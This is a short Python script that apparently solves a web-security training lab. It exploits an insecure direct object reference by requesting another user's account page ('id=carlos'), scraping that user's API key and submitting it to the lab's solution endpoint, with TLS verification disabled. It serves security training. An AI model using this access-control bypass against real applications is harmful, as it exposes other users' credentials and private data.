#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def access_carlos(s, url):
    print("[*] Accessing Carlos' account...")
    carlos_url = url + "/my-account?id=carlos"
    r = s.get(carlos_url, verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    apikey = soup.find(string=re.compile("Your API Key is")).split(": ")[1]
    print(f"[+] Carlos' API key is: {apikey}")
    apikey = apikey.strip()
    if "API Key" in r.text:
        return apikey
    return False 


def submit_answer(s, url):
    key = access_carlos(s, url)
    print("[*] Submitting answer...")
    submit_url = url + "/submitSolution"
    data = {"answer": key}
    r = s.post(submit_url, data=data, verify=False, allow_redirects=True)
    if "true" in r.text:
        return True
    return False 

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if  not submit_answer(s, url):
        print("[+] Error submitting answer")
        return
    print("[+] Lab solved")

if __name__ == "__main__":
    main()      